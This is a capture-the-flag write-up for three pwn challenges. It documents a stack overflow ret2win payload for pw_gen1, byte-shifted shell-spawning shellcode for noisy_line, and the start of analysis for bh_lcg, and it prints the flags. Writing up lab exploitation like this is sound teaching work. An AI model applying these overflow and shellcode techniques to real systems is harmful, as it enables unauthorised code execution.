# pw_gen1

The binary has the following mitigations:

```sh
checksec pw_gen1_Federico-Conti

    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    FORTIFY:    Enabled

```

**Static analysis**
As you suggest in the README, we can search for a flag call in the binary.

```sh
strings pw_gen1_Federico-Conti | grep flag
```

By analyzing the binary with Ghidra, it is possible to reconstruct the main control flow and find the flag() function that call 

```sh
system("cat flag.txt");
```

The function that generates the password, highlighting the following critical part:

- The local buffer is 320 bytes, while `fgets` can read up to 640 bytes.

This results in a **stack-based buffer overflow**, which allows an attacker to:

- overwrite local variables,
- overwrite the saved frame pointer,
- overwrite the return address (RIP).


## Exploit Strategy


1. **Find the RIP Offset**
   
To find the RIP offset, you can use a cyclic pattern generated with `pwn cyclic` and analyze the core dump with `gdb`.

```sh
pwn cyclic 400
gdb pw_gen1_Federico-Conti core
# sending pwn pattern ...
    # check REB register 
    $rbp   : 0x6461616f6461616e ("naadoaad"?)
# check offset
pwn cyclic -l naadoaad
```

The RIP offset turns out to be `352+8` bytes

2. **Building the payload**

```python
payload  = b"a" * (OFFSET_RIP)  
payload += p64(RET)  # stack alignment
payload += p64(flag_fun)
payload += p64(0xdeadbeef)  # ret addr after flag_fun
```

## Results

```sh
 python3 pwn_secure.py REMOTE
    ### output
    BASC{No7_s0_5ecuRe___fUUxa2D3}
```


# noisy_line

The program adds the character `(` (which corresponds to the hexadecimal value 0x28 or decimal 40 in ASCII) to each byte of the shellcode you send.  
We use pwntools to create shellcode that spawns a shell, and then normalize it by subtracting 40 from each byte.  
The shell context must be set to `amd64/linux` because the binary is compiled for the x86_64 architecture.

```sh
shellcode = asm(shellcraft.sh())
noisy_shellcode = bytes([(b - 0x28) % 256 for b in shellcode])
```


## Result

```sh
python3 pwn_noisy.py REMOTE
    ### output
    BASC{5o_Fl00d3d_a_SUB_w45_r3qUir3D___pylHAd1e}
```


# bh_lcg

The binary has the following mitigations:

```sh
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
    Debuginfo:  Yes
```

By analyzing the binary with Ghidra,
We can identify a system call at offset 0x1174:

```sh
objdump -d bh_lcg_Federico-Conti | grep sys
 1174:       ff 25 06 2e 00 00       jmp    *0x2e06(%rip)        # 3f80 <system@GLIBC_2.2.5>
```